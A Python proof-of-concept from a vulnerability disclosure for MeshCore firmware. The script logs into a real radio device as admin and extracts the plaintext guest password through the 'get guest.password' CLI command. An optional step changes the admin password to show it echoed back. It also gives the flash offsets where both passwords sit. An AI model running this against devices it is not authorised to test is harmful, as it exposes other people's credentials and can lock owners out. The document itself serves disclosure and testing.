#!/usr/bin/env python3
"""
Bug #18 -- PoC: Passwords Stored and Transmitted in Plaintext

Vulnerability
=============
MeshCore stores admin and guest passwords in plaintext on flash (in the
/com_prefs file) and echoes them in CLI reply packets:

  1. "password <new>"  ->  reply: "password now: <new>"  (admin password echoed)
  2. "get guest.password"  ->  reply: "> <guest_password>"  (guest password returned)
  3. Flash file /com_prefs: password at offset 56, guest_password at offset 88

The CLI command/reply is encrypted with AES-128-ECB (Bug #5), but the
password is plaintext *within* the encrypted payload.

Flash layout (relevant fields):
  Offset  Size  Field
  56      16    password         char[16]  admin password, plaintext
  88      16    guest_password   char[16]  guest password, plaintext

Attack surface
--------------
  1. Authenticated admin: "get guest.password" returns plaintext guest pw
  2. Password set echo: "password <new>" reply contains the new password
  3. Physical access: read flash directly at known offsets (56, 88)

This PoC connects to a real device, authenticates as admin, and extracts
the guest password via CLI to prove the plaintext leak.

Usage:
  python bug18-plaintext-passwords.py -p COM3 --target <pubkey_hex> --pwd <admin_pw>

  Optional: --set-password-test to also demonstrate the password echo on set

Affected code
-------------
  src/helpers/CommonCLI.cpp   -- password echo in reply, get guest.password
  src/helpers/CommonCLI.h     -- NodePrefs struct with plaintext password fields
  src/helpers/BaseChatMesh.cpp -- sendLogin sends password in plaintext payload
"""

import struct
import os
import sys
import argparse
import asyncio


# =====================================================================
# Live PoC using meshcore_py (requires hardware)
# =====================================================================

async def run_live(args):
    try:
        from meshcore import MeshCore
        from meshcore.events import EventType
    except ImportError:
        print("ERROR: meshcore_py not installed. pip install meshcore")
        sys.exit(1)

    import time

    print("=" * 70)
    print("Live PoC: Extracting passwords via meshcore_py")
    print("=" * 70)

    # Connect to companion radio
    print(f"\n[*] Connecting to companion radio on {args.port}...")
    mc = await MeshCore.create_serial(args.port, args.baudrate)
    print(f"[+] Connected")

    # Ensure contacts are loaded
    await mc.ensure_contacts()

    # Find the target contact
    target = None
    if args.target:
        target = mc.get_contact_by_key_prefix(args.target)
    if target is None:
        contacts = mc.contacts
        if contacts:
            print(f"[*] Available contacts:")
            for c in contacts:
                name = c.get('adv_name', 'unknown')
                key = c.get('public_key', b'').hex()[:16]
                print(f"    {name}: {key}...")
        print(f"[-] Target contact not found. Use --target <pubkey_prefix>")
        await mc.disconnect()
        return

    target_name = target.get('adv_name', 'unknown')
    print(f"[+] Target: {target_name}")

    # Login if password provided
    if args.password:
        print(f"[*] Logging in with password...")
        result = await mc.commands.send_login_sync(target, args.password, timeout=15)
        if result and result.type == EventType.LOGIN_SUCCESS:
            print(f"[+] Login successful (admin)")
        else:
            print(f"[-] Login failed: {result}")
            await mc.disconnect()
            return

    # Collect CLI responses
    extracted = {}

    def on_message(event):
        data = event.payload
        text = data.get('text', '')
        print(f"    Response: {repr(text)}")
        if text.startswith('> '):
            extracted['guest_password'] = text[2:]
        elif text.startswith('password now: '):
            extracted['admin_password'] = text[len('password now: '):]

    sub = mc.subscribe(EventType.CONTACT_MSG_RECV, on_message)

    # Step 1: Extract guest password
    print(f"\n[*] Step 1: Extracting guest password...")
    print(f"    Sending: get guest.password")
    await mc.commands.send_cmd(target, "get guest.password")

    # Wait for response
    import asyncio
    await asyncio.sleep(10)

    if 'guest_password' in extracted:
        print(f"\n[!!!] Guest password extracted: \"{extracted['guest_password']}\"")
    else:
        print(f"\n[*] No response received (may need longer timeout or re-login)")

    # Step 2: Demonstrate password echo on set (optional, destructive)
    if args.set_password_test:
        test_pw = f"test_{os.urandom(3).hex()}"
        print(f"\n[*] Step 2: Setting password to '{test_pw}' (will be echoed back)...")
        print(f"    Sending: password {test_pw}")
        await mc.commands.send_cmd(target, f"password {test_pw}")
        await asyncio.sleep(10)

        if 'admin_password' in extracted:
            print(f"\n[!!!] Admin password echoed back: \"{extracted['admin_password']}\"")
        else:
            print(f"\n[*] No echo received")

        # Restore original password
        if args.password:
            print(f"[*] Restoring original password...")
            await mc.commands.send_cmd(target, f"password {args.password}")
            await asyncio.sleep(5)

    mc.unsubscribe(sub)

    print(f"\n{'='*60}")
    print(f"RESULTS")
    print(f"{'='*60}")
    for field, value in extracted.items():
        print(f"  {field}: \"{value}\"")
    if not extracted:
        print(f"  (no passwords extracted -- check login status and timeout)")

    print(f"\n  Passwords were transmitted in plaintext within encrypted packets")
    print(f"  and are stored unencrypted on flash at known offsets.")

    await mc.disconnect()


# =====================================================================
# Entry point
# =====================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bug #18 -- Plaintext password PoC")
    parser.add_argument("-p", "--port", required=True, help="Serial port for companion radio")
    parser.add_argument("--target", help="Target contact public key prefix (hex)")
    parser.add_argument("--pwd", "--password", dest="password", help="Admin password for login")
    parser.add_argument("--set-password-test", action="store_true",
                        help="Also test password echo (changes password temporarily)")
    parser.add_argument("--baudrate", type=int, default=115200)
    args = parser.parse_args()

    asyncio.run(run_live(args))
